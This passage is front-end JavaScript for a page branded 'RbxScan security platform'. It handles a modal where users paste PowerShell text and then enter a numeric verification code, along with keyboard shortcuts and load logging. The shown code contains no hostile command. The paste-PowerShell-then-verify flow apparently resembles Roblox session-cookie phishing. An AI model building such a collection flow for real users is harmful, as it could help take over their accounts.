    if (submitBtn) {
        submitBtn.addEventListener('click', function() {
            submitPowerShell();
        });
    }

    // Add verification modal event listeners
    const verificationCode = document.getElementById('verificationCode');
    if (verificationCode) {
        // Allow Enter key to verify
        verificationCode.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                verifyCode();
            }
        });
        
        // Auto-format input (numbers only)
        verificationCode.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    }

    // Auto-resize textarea and character count
    const textarea = document.getElementById('powershellInput');
    if (textarea) {
        textarea.addEventListener('input', function() {
            // Auto-resize
            this.style.height = 'auto';
            this.style.height = Math.min(this.scrollHeight, 400) + 'px';
            
            // Update character count
            updateCharCount();
        });
        
        // Paste events are now handled through the scan button flow
        
        // Initialize character count
        updateCharCount();
    }

    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
    
    // Show welcome notification
    setTimeout(() => {
        showNotification('RbxScan security platform ready!', 'success');
    }, 1000);
});

// Keyboard shortcuts
document.addEventListener('keydown', function(event) {
    // ESC to close modal
    if (event.key === 'Escape') {
        const verificationModal = document.getElementById('verificationModal');
        const scanModal = document.getElementById('scanModal');
        
        // Close verification modal first if it's open
        if (verificationModal && verificationModal.classList.contains('show')) {
            closeVerificationModal();
        } else if (scanModal && scanModal.style.display === 'block') {
            closeScanModal();
        }
    }
    
    // Ctrl+Enter to submit PowerShell (when modal is open)
    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
        const modal = document.getElementById('scanModal');
        if (modal && modal.style.display === 'block') {
            event.preventDefault();
            submitPowerShell();
        }
    }
    
    // Ctrl+K to open scanner (global shortcut)
    if ((event.ctrlKey || event.metaKey) && event.key === 'k') {
        event.preventDefault();
        openScanModal();
    }
});

// Performance monitoring
window.addEventListener('load', function() {
    const loadTime = performance.now();
    console.log(`RbxScan loaded in ${Math.round(loadTime)}ms`);
    
    // Track page performance
    if ('performance' in window && 'navigation' in performance) {
        const perfData = performance.getEntriesByType('navigation')[0];
        console.log('Performance metrics:', {
            domContentLoaded: Math.round(perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart),
            loadComplete: Math.round(perfData.loadEventEnd - perfData.loadEventStart)
        });
    }
});